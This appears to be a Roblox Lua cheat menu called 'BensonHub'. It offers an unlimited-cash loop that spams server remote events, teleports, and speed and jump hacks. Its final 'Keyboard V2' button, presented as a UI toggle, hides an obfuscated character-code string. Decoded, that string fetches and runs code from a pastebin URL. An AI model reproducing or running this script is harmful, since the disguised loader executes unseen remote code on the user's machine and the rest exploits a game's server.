if game.PlaceId == 9461798258 then
-- Properties
-- BensonHub V1.0.1

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("BensonHub", "Serpent")

-- Instance

local Tab1 = Window:NewTab("Main")
local Tab1Section = Tab1:NewSection("Main")

Tab1Section:NewButton("Unlimited Cash", "Unlimited Cash", function()
      while true do
      wait(.1)
      game:GetService("ReplicatedStorage").makePoop:FireServer()
      game:GetService("ReplicatedStorage").cleanPoop:FireServer()
      end
end)

Tab1Section:NewKeybind("Keybind", "ToggleUI", Enum.KeyCode.C, function()
	  Library:ToggleUI()
end)

local Tab1Section = Tab1:NewSection("Teleport")

Tab1Section:NewButton("Main Room", "", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4, 5, 4)
end)

Tab1Section:NewButton("Expanded Room", "", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(34, 5, -15)
end)

Tab1Section:NewButton("Attic", "", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(11, 21, 1)
end)

Tab1Section:NewButton("Outside", "", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54, 4, -33)
end)

Tab1Section:NewButton("Plant Room", "", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(60, 7, -6)
end)

Tab1Section:NewButton("Secret Room", "", function()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(69, 5, -18)
end)

local Tab2 = Window:NewTab("Misc")
local Tab2Section = Tab2:NewSection("Misc")

Tab2Section:NewSlider("WalkSpeed", "Edit WalkSpeed", 250, 16, function(v)
      game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)

Tab2Section:NewSlider("JumpPower", "Edit JumpPower", 250, 50, function(v)
      game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
end)

Tab2Section:NewDropdown("Credit", "Reward 500$", {"#RunX", "Kavo-Library", "Supportive Scripters", "#Coconut_"}, function(currentOption)
       print("Credit by", currentOption)
end)

Tab2Section:NewButton("Keyboard V2", "Let Toggle The Ui", function()
        SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR) 
end)    
